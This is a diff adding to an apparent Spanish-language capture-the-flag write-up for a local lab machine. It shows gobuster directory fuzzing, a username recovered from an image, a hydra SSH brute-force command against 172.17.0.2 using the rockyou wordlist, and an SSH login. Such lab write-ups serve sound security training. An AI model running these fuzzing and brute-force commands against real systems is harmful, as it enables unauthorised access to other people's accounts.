@@ -66,4 +66,29 @@ PORT   STATE SERVICE REASON         VERSION
 |_http-title: Site doesn't have a title (text/html).
 MAC Address: 02:42:AC:11:00:02 (Unknown)
 ```
-Hacemos 
+Utilizamos **gobuster** para hacer fuzzing y ver si encontramos directorios o páginas en el puerto 80.
+
+```
+gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
+```
+Encontramos únicamente ***index.html*** en la que únicamente vemos una imagen que procedemos a descargarla para ver si encontramos algo oculto dentro.
+
+![image](https://github.com/user-attachments/assets/0e4abfa4-931c-40b0-800f-7d2921f4f966)
+
+Vemos que dentro de la imagen encontramos un usuario **borazuwarah** que podemos utilizar para conectarnos por ***ssh*** por fuerza bruta con **hydra**.
+
+## Explotación.
+
+```
+hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+```
+![image](https://github.com/user-attachments/assets/d8d5ad7e-5e8c-4f21-8be9-3631844b1349)
+
+Ahora nos conectamos por **ssh** con las credenciales obtenidas.
+
+![image](https://github.com/user-attachments/assets/481a1e42-2d48-4fe3-b56f-4b320d8b4942)
+
+
+
+
+
